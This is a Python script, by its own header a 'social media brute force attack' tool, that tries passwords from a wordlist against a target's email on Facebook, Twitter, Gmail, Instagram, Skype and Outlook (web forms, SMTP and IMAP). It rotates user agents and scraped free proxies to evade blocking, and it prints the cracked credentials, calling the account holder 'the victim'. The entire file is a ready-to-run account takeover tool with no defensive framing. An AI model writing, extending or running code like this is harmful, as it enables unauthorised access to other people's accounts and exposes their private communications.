#!/usr/bin/env python3
'''
     Python script attack all social media accounts .. written by Yasser Janah (Y4SS3R005)
    
     facebook : https://facebook.com/yasser.janah
'''
class Fore:
    BOLD = "\033[1m"
    UNDE = "\033[4m"
    GREEN = "\033[92m"
    BLUE = "\033[94m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    WHITE = "\033[0m"
    CYAN = "\033[0;36m"
try:
    #from colorama import *
    import sys
    if sys.version < '3.':
           print(Fore.RED+'Error:'+Fore.YELLOW+' python3 is required'+Fore.WHITE)
           exit()
    from threading import Thread
    import mechanicalsoup
    import os
    import argparse
    import imaplib
    import smtplib
    import skpy
    import random,time
    import requests
    import urllib.request
    import urllib.error
    from time import sleep
    from bs4 import BeautifulSoup
except ImportError as eRR:
    raise eRR
    exit()
class core:
    def print_status(text):
        print(Fore.BLUE+"[$] "+Fore.WHITE+text)
    def print_succes(text):
        print(Fore.GREEN+"[+] "+Fore.WHITE+text)
    def print_failed(text):
        print(Fore.RED+"[-] "+Fore.WHITE+text)
    def parser_error(errmsg):
        print(Fore.YELLOW+"\tUsage:"+Fore.WHITE+" python3 " + sys.argv[0] + " [Options] use -h for help")
        print(Fore.RED+"\tError: "+Fore.YELLOW+errmsg +Fore.WHITE)
        sys.exit()
    def print_help():
        print(Fore.YELLOW+"Usage:"+Fore.WHITE+" python3 " + sys.argv[0] + " -e [EMAIL] -w [WORDLIST] --facebook/--hotmail/--twitter/--skype/--gmail/--instagram")
        print(Fore.WHITE+"\n\t<< "+Fore.YELLOW+"Social Media Brute force attack .. Coded by : "+Fore.GREEN+"Yasser Janah "+Fore.RED+"("+Fore.CYAN+"Y4SS3R005"+Fore.RED+")"+Fore.WHITE+" >>")
        print(Fore.WHITE+"\t<< "+Fore.GREEN+"facebook : "+Fore.WHITE+"https://facebook.com/"+Fore.RED+"yasser.janah "+Fore.WHITE+" >>\n")
        print(Fore.WHITE+'\033[1m\033[4mrequired arguments\033[0m:')
        print(Fore.WHITE+'\t-e , --email\t\ta valid email address')
        print(Fore.WHITE+'\t-w , --wordlist\t\tfile containing passwords')
        print(Fore.WHITE+'\033[1m\033[4mfacebook arguments\033[0m:')
        print(Fore.WHITE+'\t-f , --facebook\t\tattack facebook accounts')
        print(Fore.WHITE+'\033[1m\033[4minstagram arguments\033[0m:')
        print(Fore.WHITE+'\t-i , --instagram\tattack instagram accounts')
        print(Fore.WHITE+'\033[1m\033[4mgmail arguments\033[0m:')
        print(Fore.WHITE+'\t-g , --gmail\t\tattack googlemail/gmail accounts')
        print(Fore.WHITE+'\033[1m\033[4mhotmail arguments\033[0m:')
        print(Fore.WHITE+'\t-ht , --hotmail\t\tattack hotmail/outlook accounts')
        print(Fore.WHITE+'\t      --smtp\t\tattack hotmail/outlook accounts using SMTP method')
        print(Fore.WHITE+'\t      --imap\t\tattack hotmail/outlook accounts using IMAP method')
        print(Fore.WHITE+'\033[1m\033[4mtwitter arguments\033[0m:')
        print(Fore.WHITE+'\t-t , --twitter\t\tattack twitter accounts')
        print(Fore.WHITE+'\033[1m\033[4mskype arguments\033[0m:')
        print(Fore.WHITE+'\t-s , --skype\t\tattack skype accounts\n')
    def __sucess__(email,password):
            print("\n\t"+Fore.GREEN+"[+] "+Fore.WHITE+"Email : "+Fore.YELLOW+"'"+Fore.WHITE+email+Fore.YELLOW+"'")
            print(Fore.GREEN+"\t[+] "+Fore.WHITE+"Password : "+Fore.YELLOW+"'"+Fore.WHITE+password+Fore.YELLOW+"'\n")
    def args_Error_msg():
        print(Fore.YELLOW+'\n\n[ERR]'+Fore.WHITE+' use --facebook '+Fore.RED+'OR'+Fore.WHITE+' --hotmail '+Fore.RED+'OR'+Fore.WHITE+' --instagram '+Fore.RED+'OR'+Fore.WHITE+' --gmail '+Fore.RED+'OR'+Fore.WHITE+' --twitter '+Fore.RED+'OR'+Fore.WHITE+' --skype\n\n')
class headers:
    def User_Agent(self):
        userAgent =['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
                'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
                'Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36']
        return random.choice(userAgent)
class Facebook:
    def __init__(self,email,password):
        self.email = email
        self.password = password
    def FacebookLoginAttack(self):
        browser = mechanicalsoup.StatefulBrowser()
        OpenLogin = browser.get('https://facebook.com/login.php')
        core.print_status("Trying with '"+Fore.YELLOW+self.email+Fore.WHITE+"':'"+Fore.YELLOW+self.password+Fore.WHITE+"' ..")
        FormLogin = OpenLogin.soup.select('form')[0]
        FormLogin.select('input')[15]['value'] = self.email
        FormLogin.select('input')[16]['value'] = self.password
        Response = browser.submit(FormLogin,OpenLogin.url)
        if 'login.php' in Response.url:
            pass
        elif 'checkpoint' in Response.url:
            core.__sucess__(email=self.email,password=self.password)
            print("\t"+Fore.YELLOW+"[+] "+Fore.WHITE+"the victim use "+Fore.RED+"TWO STEP VERIFICATION"+Fore.WHITE+" method to protect his account")
            exit()
        else:
            core.__sucess__(email=self.email,password=self.password)
            exit()
class Hotmail:
    def __init__(self,email,password):
        self.email = email
        self.password = password
        self.SMTP_Server = 'smtp-mail.outlook.com'
        self.SMTP_Port   = 587
        self.IMAP_Server = 'imap-mail.outlook.com'
        self.IMAP_Port   = 993
    def HotmailLoginAttack_SMTP(self):
        try:
            core.print_status("Trying with '"+Fore.YELLOW+self.email+Fore.WHITE+"':'"+Fore.YELLOW+self.password+Fore.WHITE+"' ..")
            SMTPServer = smtplib.SMTP(self.SMTP_Server,self.SMTP_Port)
            SMTPServer.ehlo()
            SMTPServer.starttls()
            SMTPServer.login(self.email,self.password)
            core.__sucess__(email=self.email,password=self.password)
            exit()
        except smtplib.SMTPAuthenticationError:
            pass
    def HotmailLoginAttack_IMAP(self):
        try:
            core.print_status("Trying with '"+Fore.YELLOW+self.email+Fore.WHITE+"':'"+Fore.YELLOW+self.password+Fore.WHITE+"' ..")
            IMAPServer = imaplib.IMAP4_SSL(self.IMAP_Server,self.IMAP_Port)
            response = IMAPServer.login(self.email,self.password)
            if 'OK' in response:
                  core.__sucess__(email=self.email,password=self.password)
                  exit()
        except Exception as Error:
            pass
class Skype:
    def __init__(self,email,password):
        self.email = email
        self.password = password
    def SkypeLoginAttack(self):
        try:
            core.print_status("Trying with '"+Fore.YELLOW+self.email+Fore.WHITE+"':'"+Fore.YELLOW+self.password+Fore.WHITE+"' ..")
            skype = skpy.Skype(self.email,self.password)
            core.__sucess__(email=self.email,password=self.password)
            exit()
        except skpy.core.SkypeAuthException:
            pass
class Twitter:
    def __init__(self,email,password):
        self.email = email
        self.password = password
        self.TwitterTitle = 'Login on Twitter'
    def TwitterLoginAttack(self):
        browser = mechanicalsoup.StatefulBrowser()
        core.print_status("Trying with '"+Fore.YELLOW+self.email+Fore.WHITE+"':'"+Fore.YELLOW+self.password+Fore.WHITE+"' ..")
        OpenLogin = browser.get('https://twitter.com/login?lang=en')
        FormLogin = OpenLogin.soup.select("form")[1]
        FormLogin.select("input")[0]['value'] = self.email
        FormLogin.select("input")[1]['value'] = self.password
        Response = browser.submit(FormLogin,OpenLogin.url)
        if Response.soup.select('title')[0].text != self.TwitterTitle:
            core.__sucess__(email=self.email,password=self.password)
            exit()
        else:
            pass
class Proxy:
    def __init__(self):
        self.url = "https://free-proxy-list.net/"
        self.ses = requests.session()
        self.headers = headers()
        self.FoundList = []
        self.ProxyList = []
    def Get_proxy(self):
        pathProxyList = os.getcwd()+os.sep+'proxys.txt'
        if os.path.isfile(pathProxyList):
                with open(pathProxyList,'r') as ProxyFile:
                            for i in ProxyFile.readlines():
                                           self.FoundList.append(i.rstrip('\n'))
                            Rn = random.randint(1,len(self.FoundList))
                            return self.FoundList[Rn]
                ProxyFile.close()
                pass
        else:
                with open(pathProxyList,'w') as ProxyFile:
                        self.ses.headers.update({'User-Agent': self.headers.User_Agent()})
                        login_html = self.ses.get(self.url)
                        soup = BeautifulSoup(login_html.content,'html.parser')
                        proxies = soup.find_all('tr')
                        for i in proxies:
                                   proxy= "http://{0}:{1}\n".format(BeautifulSoup(str(list(i)[0]),'html.parser').text,BeautifulSoup(str(list(i)[1]),'html.parser').text)
                                   self.ProxyList.append(proxy)
                        self.ProxyList.remove(self.ProxyList[0])
                        self.ProxyList.remove(self.ProxyList[-1])
                        for p in self.ProxyList:
                               ProxyFile.write(p)
                        Rn = random.randint(1,len(self.ProxyList))
                        return self.ProxyList[Rn]
                ProxyFile.close()
    def Check_proxy(self):
        pathProxyList = os.getcwd()+os.sep+'proxys.txt'
        if os.path.isfile(pathProxyList):
                    return core.print_status("Loaded proxies on "+Fore.YELLOW+"'"+Fore.WHITE+pathProxyList+Fore.YELLOW+"'"+Fore.WHITE)
        else:
                    core.print_failed("missing proxies file "+Fore.YELLOW+"'"+Fore.WHITE+pathProxyList+Fore.YELLOW+"'");time.sleep(1)
                    core.print_status("Getting new proxies file ..")
                    self.Get_proxy()
                    self.Check_proxy()
class GmailLoginAttack:
    def __init__(self,email,password):
        self.email = email
        self.password = password
        self.ses = requests.session()
        self.url_login = "https://accounts.google.com/ServiceLogin"
        self.url_auth = "https://accounts.google.com/ServiceLoginAuth"
        self.headers = headers()
        self.proxy = Proxy()
        self.ses.proxies.update({'http': self.proxy.Get_proxy()})
        login_html = self.ses.get(self.url_login)
        core.print_status("Trying with '"+Fore.YELLOW+self.email+Fore.WHITE+"':'"+Fore.YELLOW+self.password+Fore.WHITE+"' ..")
        soup_login = BeautifulSoup(login_html.content,'html.parser').find('form').find_all('input')
        my_dict = {}
        for u in soup_login:
              if u.has_attr('value'):
                     my_dict[u['name']] = u['value']
        my_dict['Email'] = self.email
        my_dict['Passwd'] = self.password
        header = {'User-Agent': self.headers.User_Agent()}
        self.ses.headers.update(header)
        self.ses.post(self.url_auth, data=my_dict)
    def get(self):
        return self.ses.get('https://google.com')
    def response(self):
        response = self.get()
        if response.status_code == 200:
                  find_email = response.text.find(self.email)
                  if find_email != -1:
                             core.__sucess__(email=self.email,password=self.password)
                             exit()
class Instagram:
    def __init__(self,email,password):
        self.email = email
        self.password = password
        self.url = 'https://www.instagram.com/'
        self.ajax_url = 'https://www.instagram.com/accounts/login/ajax/'
        self.headers = headers()
        self.accept_language = 'ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4'
        self.ses = requests.Session()
        self.proxy = Proxy()
        self.ses.proxies.update({'http': self.proxy.Get_proxy()})
        self.ses.cookies.update({
            'sessionid': '',
            'mid': '',
            'ig_pr': '1',
            'ig_vw': '1920',
            'csrftoken': '',
            's_network': '',
            'ds_user_id': ''
        })
        self.login_post = {"username": self.email, "password": self.password}
        self.ses.headers.update({
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': self.accept_language,
            'Connection': 'keep-alive',
            'Content-Length': '0',
            'Host': 'www.instagram.com',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'User-Agent': self.headers.User_Agent(),
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest'
        })
    def InstagramLoginAttack(self):
        self.response = self.ses.get(self.url)
        core.print_status("Trying with '"+Fore.YELLOW+self.email+Fore.WHITE+"':'"+Fore.YELLOW+self.password+Fore.WHITE+"' ..")
        self.ses.headers.update({'X-CSRFToken': self.response.cookies['csrftoken']})
        login = self.ses.post(self.ajax_url,data=self.login_post,allow_redirects=True)
        self.ses.headers.update({'X-CSRFToken': login.cookies['csrftoken']})
        csrftoken = login.cookies['csrftoken']
        if login.status_code == 200:
                  self.response = self.ses.get(self.url)
                  find_user = self.response.text.find(self.email)
                  if find_user != -1:
                             core.__sucess__(email=self.email,password=self.password)
                             exit()
class banners:
    def __init__(self):
        self.RED    = Fore.RED
        self.WHITE  = Fore.WHITE
        self.YELLOW = Fore.YELLOW
        self.CYAN   = Fore.CYAN
        self.BLUE   = Fore.BLUE
        self.GREEN  = Fore.GREEN
        #self.MAGEN  = Fore.MAGENTA
    def Get_banner(self):
        used = random.choice([self.RED,self.YELLOW,self.CYAN,self.BLUE,self.GREEN])#,self.MAGEN])
        banner1 = '''
                                                                    
\t{0} 8888888888',8888'{1}8 8888888888   {0}8 888888888o. {1}     ,o888888o.     
\t{0}        ,8',8888' {1}8 8888         {0}8 8888    `88.{1}  . 8888     `88.   
\t{0}       ,8',8888'  {1}8 8888         {0}8 8888     `88{1} ,8 8888       `8b  
\t{0}      ,8',8888'   {1}8 8888         {0}8 8888     ,88{1} 88 8888        `8b 
\t{0}     ,8',8888'    {1}8 888888888888 {0}8 8888.   ,88'{1} 88 8888         88 
\t{0}    ,8',8888'     {1}8 8888         {0}8 888888888P' {1} 88 8888         88 {0}S{1}OCIAL {0}M{1}EDIA {0}B{1}RUTE {0}F{1}ORCE {0}A{1}TTACK :/ 
\t{0}   ,8',8888'      {1}8 8888         {0}8 8888`8b     {1} 88 8888        ,8P made with {2}<3{1} by : YASSER JANAH
\t{0}  ,8',8888'       {1}8 8888         {0}8 8888 `8b.   {1} `8 8888       ,8P  
\t{0} ,8',8888'        {1}8 8888         {0}8 8888   `8b. {1}  ` 8888     ,88'   
\t{0},8',8888888888888 {1}8 888888888888 {0}8 8888     `88.{1}    `8888888P'     

'''.format(used,self.WHITE,self.RED)
        banner2 = '''
                                                    
\t{0}@@@@@@@@{1}  @@@@@@@@  {0}@@@@@@@ {1}   @@@@@@@@    
\t{0}@@@@@@@@{1}  @@@@@@@@  {0}@@@@@@@@{1}  @@@@@@@@@@  
\t{0}     @@!{1}  @@!       {0}@@!  @@@{1}  @@!   @@@@  
\t{0}    !@! {1}  !@!       {0}!@!  @!@{1}  !@!  @!@!@   
\t{0}   @!!  {1}  @!!!:!    {0}@!@!!@! {1}  @!@ @! !@!  {0}S{1}OCIAL {0}M{1}EDIA {0}B{1}RUTE {0}F{1}ORCE {0}A{1}TTACK :/  
\t{0}  !!!   {1}  !!!!!:    {0}!!@!@!  {1}  !@!!!  !!!   
\t{0} !!:    {1}  !!:       {0}!!: :!! {1}  !!:!   !!!   made with {2}<3{1} by : YASSER JANAH
\t{0}:!:     {1}  :!:       {0}:!:  !:!{1}  :!:    !:!   
\t{0} :: ::::{1}   :: ::::  {0}::   :::{1}  ::::::: ::   
\t{0}: :: : :{1}  : :: ::   {0} :   : :{1}   : : :  :     
                                                    
'''.format(used,self.WHITE,self.RED)
        banner3 = '''
\t{0} oooooooooooo             .oooooo..o             ooo        ooooo           oooooooooo.                       
\t{0}d'""""""d888'            d8P'    `Y8             `88.       .888'           `888'   `Y8b                      
\t{0}      .888P  {1}   .ooooo.{0}  Y88bo.      {1}   .ooooo. {0}  888b     d'888{1}   .ooooo. {0}  888     888{1} oooo d8b   
\t{0}     d888'   {1}  d88' `88b{0}  `"Y8888o.  {1}  d88' `88b{0}  8 Y88. .P  888{1}  d88' `88b{0}  888oooo888'{1} `888""8P   
\t{0}   .888P     {1}  888   888{0}       `"Y88b{1}  888   888{0}  8  `888'   888{1}  888ooo888{0}  888    `88b{1}  888       
\t{0}  d888'    .P{1}  888   888{0} oo     .d8P {1}  888   888{0}  8    Y     888{1}  888    .o{0}  888    .88P{1}  888       
\t{0}.8888888888P {1}  `Y8bod8P' {0} 8""88888P' {1}  `Y8bod8P'{0} o8o        o888o{1} `Y8bod8P' {0}o888bood8P'  {1}d888b  
                                                                                      made with {2}<3{1} by : YASSER JANAH
'''.format(used,self.WHITE,self.RED)
        display = [banner1,banner2,banner3]
        os.system('clear')
        print(random.choice(display))

def main():
    banners().Get_banner()
    parser = argparse.ArgumentParser(usage='python3 {0} -e [EMAIL] -w [WORDLIST] [--facebook OR --twitter OR --hotmail OR --skype]'.format(sys.argv[0]))
    parser.error = core.parser_error
    parser.print_help = core.print_help
    parser.add_argument('-e','--email',required=True)
    parser.add_argument('-w','--wordlist',required=True)
    parser.add_argument('-f','--facebook',dest='FacebookService',action='store_true')
    parser.add_argument('-i','--instagram',dest='InstagramService',action='store_true')
    parser.add_argument('-g','--gmail',dest='GmailService',action='store_true')
    parser.add_argument('-ht','--hotmail',dest='HotmailService',action='store_true')
    parser.add_argument('--imap',dest='HotmailServiceIMAP',action='store_true')
    parser.add_argument('--smtp',dest='HotmailServiceSMTP',action='store_true')
    parser.add_argument('-t','--twitter',dest='TwitterService',action='store_true')
    parser.add_argument('-s','--skype',dest='SkypeService',action='store_true')
    args = parser.parse_args()
    if not os.path.isfile(args.wordlist):
        core.print_failed("wordlist not found in "+Fore.YELLOW+"'"+Fore.WHITE+os.getcwd()+os.sep+args.wordlist+Fore.YELLOW+"'"+Fore.WHITE)
        exit()
    with open(args.wordlist,'r') as wlist:
        Proxy().Check_proxy()
        if args.FacebookService:
            core.print_status("Service : "+Fore.GREEN+"Facebook")
            for password in wlist.readlines():
                password = password.rstrip('\n')
                FC = Facebook(email=args.email,password=password)
                FC.FacebookLoginAttack()
        elif args.TwitterService:
            core.print_status("Service : "+Fore.GREEN+"Twitter")
            for password in wlist.readlines():
                password = password.rstrip('\n')
                TW = Twitter(email=args.email,password=password)
                TW.TwitterLoginAttack()
        elif args.GmailService:
            core.print_status("Service : "+Fore.GREEN+"Gmail")
            for password in wlist.readlines():
                password = password.rstrip('\n')
                GMsession = GmailLoginAttack(email=args.email,password=password)
                response = GMsession.response()
        elif args.InstagramService:
            core.print_status("Service : "+Fore.GREEN+"Instagram Brute force Attack")
            for password in wlist.readlines():
                password = password.rstrip('\n')
                IN = Instagram(email=args.email,password=password)
                IN.Get_service()
                IN.InstagramLoginAttack()
        elif args.SkypeService:
            core.print_status("Service : "+Fore.GREEN+"Skype")
            for password in wlist.readlines():
                password = password.rstrip('\n')
                SK = Skype(email=args.email,password=password)
                SK.SkypeLoginAttack()
        elif args.HotmailService:
            if args.HotmailServiceSMTP:
                core.print_status("Service : "+Fore.GREEN+"Hotmail/Outlook")
                for password in wlist.readlines():
                    password = password.rstrip('\n')
                    HT = Hotmail(email=args.email,password=password)
                    HT.HotmailLoginAttack_SMTP()
            elif args.HotmailServiceIMAP:
                core.print_status("Service : "+Fore.GREEN+"Hotmail/Outlook")
                for password in wlist.readlines():
                    password = password.rstrip('\n')
                    HT = Hotmail(email=args.email,password=password)
                    HT.HotmailLoginAttack_IMAP()
            else:
                core.print_status("Service : "+Fore.GREEN+"Hotmail/Outlook")
                for password in wlist.readlines():
                    password = password.rstrip('\n')
                    HT = Hotmail(email=args.email,password=password)
                    HT.HotmailLoginAttack_IMAP()
        else:
            core.args_Error_msg()
            exit()
    wlist.close()
if __name__ == '__main__':
    try:
           thread = Thread(target=main)
           thread.start()
    except Exception as Ex:
        print(Ex)
    except KeyboardInterrupt:
        exit()
